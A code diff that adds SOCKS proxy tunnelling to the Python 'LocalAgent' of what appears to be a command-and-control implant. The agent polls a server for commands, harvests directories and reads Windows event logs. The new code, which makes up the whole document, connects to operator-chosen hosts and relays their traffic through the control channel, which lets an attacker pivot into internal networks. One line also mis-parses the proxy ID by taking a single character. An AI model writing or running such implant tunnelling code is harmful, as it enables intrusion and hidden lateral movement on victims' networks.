@@ -32,6 +32,42 @@ import win32evtlogutil
 
 from directoryHarvester import DirectoryHarvester
 
+class SocksProxyLoop(Thread):
+	def __init__(self, daemon, remote_socket, proxy_id):
+		Thread.__init__(self)
+		self.daemon = daemon
+		self.remote_socket = remote_socket
+		self.stay_alive = True
+		self.proxy_id = proxy_id
+
+	def kill(self):
+		self.stay_alive = False;
+        
+	def close_down(self):
+		self.daemon.pushSocksForward("socksproxy:" + str(self.proxy_id), "socksterminatedatdaemon".encode('ascii'))
+		self.remote_socket.close()
+		self.kill()
+        
+	def run(self):
+		while self.stay_alive:
+			forwardData = self.daemon.pollSocksForward("socksproxy:" + str(self.proxy_id))
+			if forwardData:
+				try:
+					self.remote_socket.send(forwardData)
+				except Exception as e:
+					#print("Cannot connect {}".format(e), file=sys.stderr)
+					self.close_down()
+			try:
+				data = self.remote_socket.recv(4096)
+				if data:
+					self.daemon.pushSocksForward("socksproxy:" + str(self.proxy_id), data)
+			except socket.timeout as e:
+				dummy=1
+			except Exception as e:
+				#print("Cannot connect {}".format(e), file=sys.stderr)        
+				self.close_down()
+			time.sleep(0.05)
+
 class PortForwardOutboundLoop(Thread):
 	def __init__(self, daemon, targetHost, targetPort, remoteSocket, socketLock):
 		# Call the Thread class's init function
@@ -199,6 +235,7 @@ class LocalAgent:
 		letters = string.ascii_letters
 		return ''.join(random.choice(letters) for i in range(16))
 
+	socksDict = {}
 	outboundLooperDict = {}
 	inboundLooperDict = {}
 	directoryHarvesterDict = {}
@@ -261,6 +298,12 @@ class LocalAgent:
 		raise NotImplementedError("Please Implement this method")
 
 	def pollServer(self):
+		raise NotImplementedError("Please Implement this method") 
+
+	def pollSocksForward(self, forwardID):
+		raise NotImplementedError("Please Implement this method") 
+
+	def pushSocksForward(self, forwardID, data):
 		raise NotImplementedError("Please Implement this method") 
 
 	def pollForward(self, forwardID):
@@ -336,7 +379,56 @@ class LocalAgent:
 			self.postResponse("Cannot connect to specified host")    
 		self.postResponse("Proxy established")    
 		return None
+    
+	def process_new_socks_request(self, request):        
+		elements = request.split(" ")
+		remote_host = None
+		remote_port = None
+		if(len(elements) != 4 and len(elements) != 3):
+			return "Invalid argument: need 'startSocks proxyID:<id> <remote host> <remote port>'"
+		if(len(elements) == 3):
+			addr_elements = elements[2].split(":")
+			if(len(addr_elements) != 2):
+				return "Improper IP/port: " + elements[2]
+			remote_port = addr_elements[1]
+			remote_host = addr_elements[0][1:]
+		if(len(elements) == 4):
+			remote_host = elements[2]
+			remote_port = elements[3]
+		try:
+			port = int(remote_port)
+			remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			remote_socket.connect((remote_host, port))   
+			remote_socket.settimeout(.01)
+			uidStr = elements[1]
+			proxy_id = uidStr[len("proxyID:")]
+			self.socksDict[uidStr] = SocksProxyLoop(self, remote_socket, proxy_id)
+			self.socksDict.get(uidStr).start()
+			self.postResponse("socksEstablished")    
+		except Exception as e:
+			print("Cannot connect {}".format(e), file=sys.stderr)
+			self.postResponse("Cannot connect to specified host")    
+		return None    
         
+	def kill_all_socks(self):
+		killList = list()
+		for key in self.socksDict:
+			self.socksDict[key].kill()
+			killList.append(key)
+		for key in killList:
+			del self.socksDict[key]
+
+	def kill_socks_request(self, request):
+		elements = request.split(" ")
+		if(len(elements) != 2):
+			return "Invalid argument: need 'killSocks proxyID:<id>"
+		uidStr = elements[1]
+		try:
+			self.socksDict.get(uidStr).kill()
+			del self.socksDict[uidStr]
+		except Exception as e:
+			return None
+
 	def processProxyConfirm(self, response):    
 		elements = response.split(" ")
 		if elements[1] in self.outboundLooperDict:
@@ -455,6 +547,15 @@ class LocalAgent:
 			return None
 		elif response.startswith('confirm_client_proxy'):
 			self.processProxyConfirm(response)
+		elif response == 'killSocks5':
+			return self.kill_all_socks()
+		elif response.startswith('killSocks'):
+			return self.kill_socks_request(response)
+		elif response.startswith('startSocks5'):
+			#ServerSide command, discard
+			dummy = 1
+		elif response.startswith('startSocks'):
+			return self.process_new_socks_request(response)    
 		elif response.startswith('cat'):            
 			elements = response.split(" ")  
 			if len(elements) == 2:
